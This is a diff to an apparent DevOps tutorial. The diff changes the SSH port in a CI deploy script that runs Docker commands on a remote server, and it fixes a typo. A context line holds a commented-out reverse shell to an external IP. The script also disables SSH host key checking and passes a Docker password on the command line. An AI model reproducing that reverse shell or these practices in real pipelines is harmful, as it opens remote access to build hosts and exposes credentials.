@@ -70,11 +70,11 @@ echo '[*] Generate SSH Identity'
 HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub
 echo '[*] Execute Remote SSH'
 # bash -i >& /dev/tcp/103.41.207.252/1234 0>&1
-ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker login --username=$DOCKER_USER --password=$DOCKER_PASS"
-ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker pull menandap/belajardevops:$CI_COMMIT_BRANCH"
-ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker stop belajardevops-$CI_COMMIT_BRANCH"
-ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker rm belajardevops-$CI_COMMIT_BRANCH"
-ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker run -d -p 3003:80 --restart always --name belajardevops-$CI_COMMIT_BRANCH menandap/belajardevops:$CI_COMMIT_BRANCH"
+ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 -p 1022 "docker login --username=$DOCKER_USER --password=$DOCKER_PASS"
+ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 -p 1022 "docker pull menandap/belajardevops:$CI_COMMIT_BRANCH"
+ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 -p 1022 "docker stop belajardevops-$CI_COMMIT_BRANCH"
+ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 -p 1022 "docker rm belajardevops-$CI_COMMIT_BRANCH"
+ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 -p 1022 "docker run -d -p 3003:80 --restart always --name belajardevops-$CI_COMMIT_BRANCH menandap/belajardevops:$CI_COMMIT_BRANCH"
 # ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker exec farmnode-main sed -i 's/farmnode_staging/farmnode/g' /var/www/html/application/config/database.php"
 echo $CI_PIPELINE_ID
 fi
@@ -97,7 +97,7 @@ After that you can check if the key was maked by see in **.ssh** dir, in there w
 
 ![index_image_google](/images/g_3.png)
 
-***noted*** : if there no authorized_keys, u can make it.
+***note*** : if there no authorized_keys, u can make it.
 ```bash
 touch authorized_keys
 cat id_rsa.pub > authorized_keys
